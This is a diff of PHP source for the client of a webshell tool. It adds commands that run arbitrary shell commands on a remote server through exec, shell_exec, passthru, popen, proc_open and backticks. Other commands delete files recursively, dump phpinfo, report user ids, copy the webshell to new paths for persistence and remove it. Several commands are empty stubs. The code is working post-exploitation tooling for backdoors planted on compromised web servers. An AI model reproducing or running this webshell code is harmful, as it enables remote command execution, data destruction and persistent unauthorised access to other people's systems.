-                            if($user_name = @posix_getpwuid($info["uid"]))
-                            {
-                                $user_name = $user_name["name"];
-                            }
-                        }
-
-                        if(function_exists("posix_getgrgid"))
-                        {
-                            if($group_name = @posix_getgrgid($info["gid"]))
-                            {
-                                $group_name = $group_name["name"];
-                            }
-                        }
-
-                        $item = array(
-                            "name"        => $filename,
-                            "perms"       => $info["mode"],
-                            "size"        => $info["size"],
-                            "user_name"   => $user_name,
-                            "group_name"  => $group_name
-                        );
-                    }
-                    else
-                    {
-                        $item = array(
-                            "name"        => $filename,
-                            "perms"       => 0000,
-                            "size"        => 0,
-                            "user_name"   => "-",
-                            "group_name"  => "-"
-                        );
-                    }
-
-                    if(is_dir($filename))
-                    {
-                        $item["name"] .= "/";
-                        $dirs[] = $item;
-                    }
-                    else
-                    {
-                        $files[] = $item;
-                    }
-                }
-
-                sort($dirs);
-                sort($files);
-
-                $result = array_merge($dirs, $files);
-            ');
-
-            if($echo)
+            else if($method === 'exec')
             {
-                $limits = array(
-                    'max_size_perms'     => strlen('Permissions'),
-                    'max_size_username'  => strlen('User'),
-                    'max_size_groupname' => strlen('Group'),
-                    'max_size_size'      => strlen('Size'),
-                    'max_size_name'      => strlen('Name')
-                );
-                $lines = array();
-
-                foreach($result as $item)
-                {
-                    $line = array(
-                        'perms'     => $this->octToHumanPerms($item->perms),
-                        'username'  => $item->user_name,
-                        'groupname' => $item->group_name,
-                        'size'      => $this->formatBytes($item->size),
-                        'name'      => $item->name
-                    );
-
-                    // Set limits
-                    if(strlen($line['perms']) > $limits['max_size_perms'])
-                    {
-                        $limits['max_size_perms'] = strlen($line['perms']);
-                    }
-
-                    if(strlen($line['username']) > $limits['max_size_username'])
-                    {
-                        $limits['max_size_username'] = strlen($line['username']);
-                    }
-
-                    if(strlen($line['groupname']) > $limits['max_size_groupname'])
-                    {
-                        $limits['max_size_groupname'] = strlen($line['groupname']);
-                    }
-
-                    if(strlen($line['size']) > $limits['max_size_size'])
-                    {
-                        $limits['max_size_size'] = strlen($line['size']);
-                    }
-
-                    if(strlen($line['name']) > $limits['max_size_name'])
-                    {
-                        $limits['max_size_name'] = strlen($line['name']);
-                    }
-
-                    $lines[] = $line;
-                }
-
-                echo substr(
-                    "  ".str_pad('Permissions',          $limits['max_size_perms'],     " ", STR_PAD_RIGHT)." ".
-                    "  ".str_pad('User',                 $limits['max_size_username'],  " ", STR_PAD_RIGHT)." ".
-                    "  ".str_pad('Group',                $limits['max_size_groupname'], " ", STR_PAD_RIGHT)." ".
-                    "  ".str_pad('Size',                 $limits['max_size_size'],      " ", STR_PAD_RIGHT)." ".
-                    "  ".str_pad('Name',                 $limits['max_size_name'],      " ", STR_PAD_RIGHT)." "
-                , 0, 80)."\n ────────────────────────────────────────────────────────────── \n";
-
-                foreach($lines as $line)
-                {
-                    echo
-                        "  ".str_pad($line['perms'],     $limits['max_size_perms'],     " ", STR_PAD_LEFT )." ".
-                        "  ".str_pad($line['username'],  $limits['max_size_username'],  " ", STR_PAD_RIGHT)." ".
-                        "  ".str_pad($line['groupname'], $limits['max_size_groupname'], " ", STR_PAD_RIGHT)." ".
-                        "  ".str_pad($line['size'],      $limits['max_size_size'],      " ", STR_PAD_LEFT )." ".
-                        "  ".$line['name']."\n";
-                }
+                $this->sendBuffer('
+                    exec("'.$this->escapePHP($command).'", $lines);
+                    echo implode("\n", $lines)."\n";
+                ', 'self::callbackCommandGenericFlush', true);
+                $this->log('', $debug_level); // Newline
+                return true;
             }
-
-            return $result;
-        }
-        else if(in_array($command, array('shellpath')))
-        {
-            $result = $this->sendBuffer('
-                $result = dirname(__file__)."/";
-            ');
-
-            if($echo)
+            else if($method === 'shell_exec')
             {
-                echo $result."\n";
+                $this->sendBuffer('
+                    echo shell_exec("'.$this->escapePHP($command).'");
+                ', 'self::callbackCommandGenericFlush', true);
+                $this->log('', $debug_level); // Newline
+                return true;
             }
-
-            return $result;
-        }
-        else if(in_array($command, array('pwd')))
-        {
-            if($echo)
+            else if($method === 'passthru')
             {
-                echo $this->current_dir."\n";
+                $this->sendBuffer('
+                    echo passthru("'.$this->escapePHP($command).'");
+                ', 'self::callbackCommandGenericFlush', true);
+                $this->log('', $debug_level); // Newline
+                return true;
             }
-
-            return $this->current_dir;
-        }
-        else if(in_array($command, array('uname')))
-        {
-            $result = $this->sendBuffer('
-                $result = php_uname();
-            ');
-
-            if($echo)
+            else if($method === 'popen')
             {
-                echo $result."\n";
+                $this->sendBuffer('
+                    $handler = popen("'.$this->escapePHP($command).'", "r");
+                    while(!feof($handler))
+                    {
+                        echo fread($handler, 1024);
+                    }
+                    @pclose($handler);
+                ', 'self::callbackCommandGenericFlush', true);
+                $this->log('', $debug_level); // Newline
+                return true;
             }
+            else if($method === 'proc_open')
+            {
+                $this->sendBuffer('
+                    $process = proc_open("'.$this->escapePHP($command).'", array(
+                       0 => array("pipe", "r"),
+                       1 => array("pipe", "w")
+                    ), $pipes, $current_dir, array());
 
-            return $result;
-        }
-        else if(in_array($command, array('exit', 'quit')))
-        {
-            echo "! Bye.\n";
-            exit;
+                    if (is_resource($process))
+                    {
+                        fclose($pipes[0]);
+                        echo stream_get_contents($pipes[1]);
+                        fclose($pipes[1]);
+                        proc_close($process);
+                    }
+                ', 'self::callbackCommandGenericFlush', true);
+                $this->log('', $debug_level); // Newline
+                return true;
+            }
+            else if($method === 'explicit')
+            {
+                $this->sendBuffer('
+                    $command = "'.$this->escapePHP($command).'";
+                    echo `$command`;
+                ', 'self::callbackCommandGenericFlush', true);
+                $this->log('', $debug_level); // Newline
+                return true;
+            }
+            else
+            {
+                $this->log('! Unknown method. See help command.', $debug_level);
+            }
         }
         else
         {
-            echo "! Command not found.\n";
+            $this->log('! Need more arguments.', $debug_level);
         }
+        return false;
+    }
+
+    private function cmd_edit($argv, $debug_level = 1)
+    {
+        // ...
+    }
+
+    private function cmd_nano($argv, $debug_level = 1)
+    {
+        // ...
+    }
+
+    private function cmd_vi($argv, $debug_level = 1)
+    {
+        // ...
+    }
+
+    private function cmd_vim($argv, $debug_level = 1)
+    {
+        // ...
+    }
+
+    private function cmd_gedit($argv, $debug_level = 1)
+    {
+        // ...
+    }
+
+    private function cmd_notepad($argv, $debug_level = 1)
+    {
+        // ...
+    }
+
+    private function cmd_sublime($argv, $debug_level = 1)
+    {
+        // ...
+    }
+
+    private function cmd_mysql($argv, $debug_level = 1)
+    {
+        // ...
+    }
+
+    private function cmd_mysqldump($argv, $debug_level = 1)
+    {
+        // ...
+    }
+
+    private function cmd_download($argv, $debug_level = 1)
+    {
+        // ...
+    }
+
+    private function cmd_upload($argv, $debug_level = 1)
+    {
+        // ...
+    }
+
+    private function cmd_mkdir($argv, $debug_level = 1)
+    {
+        $dirname = (count($argv) > 0) ? implode(' ', $argv) : '';
+
+        $result = $this->sendBuffer('
+            $result = 0;
+            if(@mkdir("'.$this->escapePHP($dirname).'", 0777, true))
+            {
+                $result = 1;
+            }
+        ');
+
+        if((int)$result === 1)
+        {
+            return true;
+        }
+
+        $this->log('! Unable to create the directory on this route.', $debug_level);
+        return false;
+    }
+
+    private function cmd_rm($argv, $debug_level = 1)
+    {
+        $path = (count($argv) > 0) ? implode(' ', $argv) : '';
+
+        $result = $this->sendBuffer('
+            $path = "'.$this->escapePHP($path).'";
+
+            function del_tree($dir)
+            {
+                $files = array_diff(scandir($dir), array(".", ".."));
+                foreach ($files as $file)
+                {
+                    if(is_dir("$dir/$file"))
+                    {
+                        del_tree("$dir/$file");
+                    }
+                    else
+                    {
+                        @unlink("$dir/$file");
+                    }
+                }
+                return @rmdir($dir);
+            } 
+
+            if(is_dir($path))
+            {
+                if(del_tree($path))
+                {
+                    $result = 1;
+                }
+                else
+                {
+                    $result = 0;
+                }
+            }
+            else if(is_file($path))
+            {
+                if(unlink($path))
+                {
+                    $result = 1;
+                }
+                else
+                {
+                    $result = 0;
+                }
+            }
+            else
+            {
+                $result = -1;
+            }
+        ');
+
+        if((int)$result === 0)
+        {
+            $this->log('Unable to delete the file or directory. Verify that you have permissions.', $debug_level);
+        }
+        else if((int)$result === -1)
+        {
+            $this->log('The file or directory does not exist.', $debug_level);
+        }
+        else if((int)$result === 1)
+        {
+            $this->log('Deleted!', $debug_level);
+            return true;
+        }
+        else
+        {
+            $this->log('Error 500: invalid status.', $debug_level);
+        }
+
+        return false;
+    }
+
+    private function cmd_phpinfo($argv, $debug_level = 1)
+    {
+        $result = $this->sendBuffer('
+            ob_start();
+            phpinfo(-1);
+
+            $pi = preg_replace(
+                array(
+                    "#PHP Credits(.*)#ms",
+                    "#^.*<body>(.*)</body>.*$#ms", "#<h2>PHP License</h2>.*$#ms",
+                    "#<h1>Configuration</h1>#", "#\r?\n#", "#</(h1|h2|h3|tr)>#",
+                    "# +<#", "#[ \t]+#", "#&nbsp;#", "#  +#", "# class=\\".*?\\"#", "%&#039;%", 
+                    "#<tr>(?:.*?)\\" src=\\"(?:.*?)=(.*?)\\" alt=\\"PHP Logo\\" /></a><h1>PHP Version (.*?)</h1>(?:\n+?)</td></tr>#",
+                    "#<tr>(?:.*?)\\" src=\\"(?:.*?)=(.*?)\\"(?:.*?)Zend Engine (.*?),(?:.*?)</tr>#",
+                    "# +#", "#<tr>#", "#</tr>#"
+                ),
+                array(
+                    "", "\\$1", "", "", "", "</\\$1>\n", "<", " ", " ", " ", "", " ",
+                    "<h2>PHP Configuration</h2>\n"."<tr><td>PHP Version</td><td>\\$2</td></tr>".
+                    "\n<tr><td>PHP Egg</td><td>\\$1</td></tr>",
+                    "<tr><td>Zend Engine</td><td>\\$2</td></tr>\n".
+                    "<tr><td>Zend Egg</td><td>\\$1</td></tr>", " ", "%S%", "%E%"
+                ),
+                ob_get_clean()
+            );
+
+            $sections = explode("<h2>", strip_tags($pi, "<h2><th><td>"));
+            unset($sections[0]);
+
+            $pi = array();
+            foreach($sections as $section){
+                $n = substr($section, 0, strpos($section, "</h2>"));
+                preg_match_all("#%S%(?:<td>(.*?)</td>)?(?:<td>(.*?)</td>)?(?:<td>(.*?)</td>)?%E%#", $section, $askapache, PREG_SET_ORDER);
+                foreach($askapache as $m)
+                    $pi[$n][$m[1]]= (!isset($m[3]) || $m[2] == $m[3]) ? $m[2] : array_slice($m, 2);
+            }
+            
+            $result = $pi;
+        ');
+
+        $message = '';
+        foreach($result as $title => $items)
+        {
+            $message .= 
+                "+".str_repeat("-", 78)."+\n".
+                "| ".str_pad(" ".strtoupper($title)." ", 76, ' ', STR_PAD_BOTH)." |\n".
+                "+".str_repeat("-", 78)."+\n";
+
+            foreach($items as $var => $val)
+            {
+                if(is_array($val))
+                {
+                    $val = implode(", ", $val);
+                }
+                $var = htmlspecialchars_decode($var, ENT_QUOTES);
+                $val = htmlspecialchars_decode($val, ENT_QUOTES);
+
+                $message .= '| '.str_pad($var, 36, ' ', STR_PAD_RIGHT).' | '.str_pad($val, 37, ' ', STR_PAD_RIGHT)." |\n";
+            }
+            $message .= "+".str_repeat("-", 78)."+\n\n";
+        }
+
+        $this->log($message, $debug_level);
+        return $result;
+    }
+
+    private function cmd_id($argv, $debug_level = 1)
+    {
+        $result = $this->sendBuffer('
+            $uid       = getmyuid();
+            $gid       = getmygid();
+            $username  = get_current_user();
+            $groupname = "";
+
+            if(function_exists("posix_getgrgid"))
+            {
+                if($groupname = @posix_getgrgid($gid))
+                {
+                    $groupname = $groupname["name"];
+                }
+            }
+
+            $result = "uid=".$uid."(".$username.") gid=".$gid."(".$groupname.")";
+        ');
+
+        $this->log($result, $debug_level);
+        return $result;
+    }
+
+    private function cmd_ls($argv, $debug_level = 1)
+    {
+        $result = $this->sendBuffer('
+            clearstatcache();
+
+            $files        = array();
+            $dirs         = array();
+            $dir_handler  = opendir("./");
+
+            while (false !== ($filename = readdir($dir_handler)))
+            {
+                $info = @stat($filename);
+                
+                $user_name  = "-";
+                $group_name = "-";
+                
+                if($info)
+                {
+                    if(function_exists("posix_getpwuid"))
+                    {
+                        if($user_name = @posix_getpwuid($info["uid"]))
+                        {
+                            $user_name = $user_name["name"];
+                        }
+                    }
+
+                    if(function_exists("posix_getgrgid"))
+                    {
+                        if($group_name = @posix_getgrgid($info["gid"]))
+                        {
+                            $group_name = $group_name["name"];
+                        }
+                    }
+
+                    $item = array(
+                        "name"        => $filename,
+                        "perms"       => $info["mode"],
+                        "size"        => $info["size"],
+                        "user_name"   => $user_name,
+                        "group_name"  => $group_name
+                    );
+                }
+                else
+                {
+                    $item = array(
+                        "name"        => $filename,
+                        "perms"       => 0000,
+                        "size"        => 0,
+                        "user_name"   => "-",
+                        "group_name"  => "-"
+                    );
+                }
+
+                if(is_dir($filename))
+                {
+                    $item["name"] .= "/";
+                    $dirs[] = $item;
+                }
+                else
+                {
+                    $files[] = $item;
+                }
+            }
+
+            sort($dirs);
+            sort($files);
+
+            $result = array_merge($dirs, $files);
+        ');
+
+        $limits = array(
+            'max_size_perms'     => strlen('Permissions'),
+            'max_size_username'  => strlen('User'),
+            'max_size_groupname' => strlen('Group'),
+            'max_size_size'      => strlen('Size'),
+            'max_size_name'      => strlen('Name')
+        );
+        $lines = array();
+
+        foreach($result as $item)
+        {
+            $line = array(
+                'perms'     => $this->octToHumanPerms($item->perms),
+                'username'  => $item->user_name,
+                'groupname' => $item->group_name,
+                'size'      => $this->formatBytes($item->size),
+                'name'      => $item->name
+            );
+
+            // Set limits
+            if(strlen($line['perms']) > $limits['max_size_perms'])
+            {
+                $limits['max_size_perms'] = strlen($line['perms']);
+            }
+
+            if(strlen($line['username']) > $limits['max_size_username'])
+            {
+                $limits['max_size_username'] = strlen($line['username']);
+            }
+
+            if(strlen($line['groupname']) > $limits['max_size_groupname'])
+            {
+                $limits['max_size_groupname'] = strlen($line['groupname']);
+            }
+
+            if(strlen($line['size']) > $limits['max_size_size'])
+            {
+                $limits['max_size_size'] = strlen($line['size']);
+            }
+
+            if(strlen($line['name']) > $limits['max_size_name'])
+            {
+                $limits['max_size_name'] = strlen($line['name']);
+            }
+
+            $lines[] = $line;
+        }
+
+        $message = '';
+        $message .= substr(
+            "  ".str_pad('Permissions',          $limits['max_size_perms'],     " ", STR_PAD_RIGHT)." ".
+            "  ".str_pad('User',                 $limits['max_size_username'],  " ", STR_PAD_RIGHT)." ".
+            "  ".str_pad('Group',                $limits['max_size_groupname'], " ", STR_PAD_RIGHT)." ".
+            "  ".str_pad('Size',                 $limits['max_size_size'],      " ", STR_PAD_RIGHT)." ".
+            "  ".str_pad('Name',                 $limits['max_size_name'],      " ", STR_PAD_RIGHT)." "
+        , 0, 80)."\n ────────────────────────────────────────────────────────────── \n";
+
+        foreach($lines as $line)
+        {
+            $message .=
+                "  ".str_pad($line['perms'],     $limits['max_size_perms'],     " ", STR_PAD_LEFT )." ".
+                "  ".str_pad($line['username'],  $limits['max_size_username'],  " ", STR_PAD_RIGHT)." ".
+                "  ".str_pad($line['groupname'], $limits['max_size_groupname'], " ", STR_PAD_RIGHT)." ".
+                "  ".str_pad($line['size'],      $limits['max_size_size'],      " ", STR_PAD_LEFT )." ".
+                "  ".$line['name']."\n";
+        }
+
+        $this->log($message, $debug_level);
+        return $result;
+    }
+
+    private function cmd_shellpath($argv, $debug_level = 1)
+    {
+        $result = $this->sendBuffer('
+            $result = dirname(__file__)."/";
+        ');
+
+        $this->log($result, $debug_level);
+        return $result;
+    }
+
+    private function cmd_pwd($argv, $debug_level = 1)
+    {
+        $this->log($this->current_dir, $debug_level);
+        return $this->current_dir;
+    }
+
+    private function cmd_install($argv, $debug_level = 1)
+    {
+        $filepath = (count($argv) > 0) ? implode(' ', $argv) : '';
+            
+        $result = $this->sendBuffer('
+            $filepath  = "'.$this->escapePHP($filepath).'";
+
+            function inst($filepath)
+            {
+                // for __file__ from eval (php bug)
+                @file_put_contents($filepath, file_get_contents(trim(preg_replace(\'/\\(.*$/\', "", __FILE__))));
+                return file_exists($filepath);
+            }
+
+            function checkdir($directory)
+            {
+                if(is_dir($directory))
+                {
+                    return true;
+                }
+                else
+                {
+                    @mkdir($directory, 0700, true);
+
+                    if(is_dir($directory))
+                    {
+                        return true;
+                    }
+                    else
+                    {
+                        return false;
+                    }
+                }
+            }
+
+            if((strpos($filepath, "/") !== false) || (strpos($filepath, "\\\\") !== false))
+            {
+                $directory = dirname($filepath);
+
+                if(checkdir($directory))
+                {
+                    $result = inst($filepath) ? 1 : -1;
+                }
+                else
+                {
+                    $result = -2;
+                }
+            }
+            else
+            {
+                $result = inst($filepath) ? 1 : -1;
+            }
+        ');
+
+        if((int)$result === 1)
+        {
+            $this->log('Installed a copy of server into path!.', $debug_level);
+            return true;
+        }
+        else if((int)$result === -1)
+        {
+            $this->log('Unable write on specific directory. Check your permissions and try again.', $debug_level);
+        }
+        else if((int)$result === -2)
+        {
+            $this->log('The directory of the copy does not exists and canot make this. Check your permissions and try again.', $debug_level);
+        }
+        else
+        {
+            $this->log('Error 500: invalid status.', $debug_level);
+        }
+        return false;
+    }
+
+    private function cmd_uninstall($argv, $debug_level = 1)
+    {
+        $result = $this->sendBuffer('
+            $filename = trim(preg_replace(\'/\\(.*$/\', "", __FILE__));
+            @unlink($filename);
+            $result = file_exists($filename) ? -1 : 1;
+        ');
+
+        if((int)$result === 1)
+        {
+            $this->log('The WebShell server has been successfully removed!.', $debug_level);
+
+            // Disconnect from server
+            return $this->callExec('exit', array(), 0);
+        }
+        else if((int)$result === -1)
+        {
+            $this->log('Unable to delete the file. Check your permissions and try again.', $debug_level);
+        }
+        else
+        {
+            $this->log('Error 500: invalid status.', $debug_level);
+        }
+        return false;
+    }
+
+    private function cmd_exit($argv, $debug_level = 1)
+    {
+        $this->log('! Bye.', $debug_level);
+        exit;
+    }
+
+    private function callExec($command, $argv, $debug_level = 1)
+    {
+        if(isset($this->functions[$command]))
+        {
+            if(method_exists(__CLASS__, $this->functions[$command]['function']))
+            {
+                return call_user_func('self::'.$this->functions[$command]['function'], $argv, (int)$debug_level);
+            }
+        }
+        else
+        {
+            $this->log('! Command not found.', $debug_level);
+        }
+        return false;
     }
 
     private function sendBuffer($buffer_sent, $callback_line = false, $raw_mode = false)
